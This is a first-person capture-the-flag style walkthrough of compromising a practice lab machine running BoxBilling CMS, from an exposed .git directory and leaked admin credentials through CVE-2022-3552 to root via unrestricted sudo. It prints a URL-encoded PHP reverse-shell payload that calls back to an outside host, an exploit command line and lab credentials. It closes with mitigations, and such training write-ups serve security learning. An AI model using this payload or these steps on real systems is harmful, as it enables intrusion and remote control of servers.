## Introduction

In this walkthrough, I exploited a PG Practice machine running BoxBilling CMS. Upon scanning the target, I identified ports **22** (SSH) and **80** (HTTP) as open. After resolving the domain `bullybox.local` by adding it to my `/etc/hosts` file, I navigated to the web interface and discovered that the site was running **BoxBilling CMS version 4.22.1.5**, which I confirmed by inspecting the page source.

To gain administrative access, I conducted a `gobuster` directory scan and discovered an exposed **.git** directory. Using `git-dumper`, I cloned the repository locally and analyzed its contents. Within the dumped files, I found credentials for an admin account. Using these credentials, I logged into the admin panel and exploited a known vulnerability — **CVE-2022-3552** — to gain a foothold on the system.

After obtaining initial shell access, I enumerated further and discovered that the current user had unrestricted **sudo** privileges. By running `sudo su`, I escalated my privileges and obtained a root shell.

## Nmap

### TCP

Run a quick Nmap TCP scan:

```bash
sudo nmap -sV $IP --open
```

### UDP

Check top 100 UDP ports:

```bash
sudo nmap -sU -F $IP
```

### Full Port Scan

```bash
sudo nmap -sV -sC -p- $IP -Pn -n -v --open
```

## Services

### Port 22

We usually skip SSH.

## Web

### Port 80

- Version - Apache httpd 2.4.52
    
    ```bash
    searchsploit Apache 2.4.52
    ```
    
    The following exploits are added to the Loot for worst case:
    
    - [ ]  [Apache HTTP Server 2.4.50 - Path Traversal & RCE](https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://www.exploit-db.com/exploits/50406&ved=2ahUKEwis2Mniv4mNAxXwhP0HHY7GDocQFnoECCAQAQ&usg=AOvVaw15cTzSV3jopMdoKTrxLuxE)
    - [ ]  [Apache 2.4.x - Buffer Overflow](https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://www.exploit-db.com/exploits/51193&ved=2ahUKEwis2Mniv4mNAxXwhP0HHY7GDocQFnoECBEQAQ&usg=AOvVaw32CfKKhtdF8vCQmFaTpO_s)

- We navigating to the site it fails to find `bullybox.local` add that to `/etc/hosts` file.
- **robots.txt and sitemap.xml**

    When navigating to uploads I noticed admin user email:
    
    `admin@bullybox.local`
    

We see that Boxbilling version of `4.22.1.5`:

![image.png](image%203.png)

Searching for public exploits we can find one:
[BoxBilling<=4.22.1.5 - Remote Code Execution (RCE)](https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://www.exploit-db.com/exploits/51108&ved=2ahUKEwjcz67twImNAxXl_rsIHeukHjEQFnoECBkQAQ&usg=AOvVaw2pVMqgdik2CPa2VhCDdofl)

I registered as `kh4n@gmail.com : password123` and tried running the exploit. But it mentions that we need to be admin. I noticed from Gobuster scan that our server acting as non-bare git repo that and contains `.git` directory. We can use `git-dumper` and dump that repo locally.

[git-dumper](https://notes.benheater.com/books/web/page/git-dumper)

![image.png](image%204.png)

In Python virtual environment install `git-dumper`:

```bash
mkdir venv
cd venv
python3 -m venv .venv
source .venv/bin/activate
pipx install git-dumper
```

Then run:

```bash
git-dumper http://bullybox.local/ git_loot
```

Reading `bb-config.php` file we can see admin user and their password:

## Loot

- [ ]  [Apache HTTP Server 2.4.50 - Path Traversal & RCE](https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://www.exploit-db.com/exploits/50406&ved=2ahUKEwis2Mniv4mNAxXwhP0HHY7GDocQFnoECCAQAQ&usg=AOvVaw15cTzSV3jopMdoKTrxLuxE)
- [ ]  [Apache 2.4.x - Buffer Overflow](https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://www.exploit-db.com/exploits/51193&ved=2ahUKEwis2Mniv4mNAxXwhP0HHY7GDocQFnoECBEQAQ&usg=AOvVaw32CfKKhtdF8vCQmFaTpO_s)

## Credentials

```bash
admin@bullybox.local : Playing-Unstylish7-Provided
```

I used this [POC](https://github.com/0xk4b1r/CVE-2022-3552/tree/main) but couldn’t get a reverse shell.

```bash
python3 CVE-2022-3552.py  -d http://192.168.164.27 -u admin@bullybox.local -p Playing-Unstylish7-Provided
```

I saw that person in ExploitDB page URL encoded phpinfo, that’s why I URL-encoded reverse shell in POC.

```php
<%3fphp+exec("/bin/bash+-c+'bash+-i+>%26+/dev/tcp/192.168.45.155/80+0>%261'")%3b%3f>
```

![image.png](image%206.png)

But this didn’t work either. So I changed to original ExploitDB POC.

I intercepted request then changed its request method in Burp and make it similar to the one provided in POC.

 Right in Burp Suite I URL-encoded the shell using **CTRL+U**.

![image.png](image%207.png)

And then accessed it from browser:

![image.png](image%208.png)

Now I got a shell.

## Privilege Escalation

Right with `id` command we can see that we are in `sudo` group.

![image.png](image%2010.png)

Ridiculously we can execute any command without a password as root:

```bash
sudo -l
```

![image.png](image%2011.png)

```bash
sudo su
```

![image.png](image%2012.png)

Now we are root!

## Mitigation

- **Restrict access to sensitive directories** like `.git` on production web servers using `.htaccess` or web server configuration.
- **Update BoxBilling CMS** to the latest patched version to avoid known vulnerabilities such as CVE-2022-3552.
- **Use strong, unique credentials** and avoid hardcoding them in repositories.
- **Implement proper sudo policy**: Restrict `sudo` access and use role-based access controls to limit privilege escalation opportunities.
- **Perform regular security audits** and code reviews to catch exposed secrets and configuration flaws before deployment.
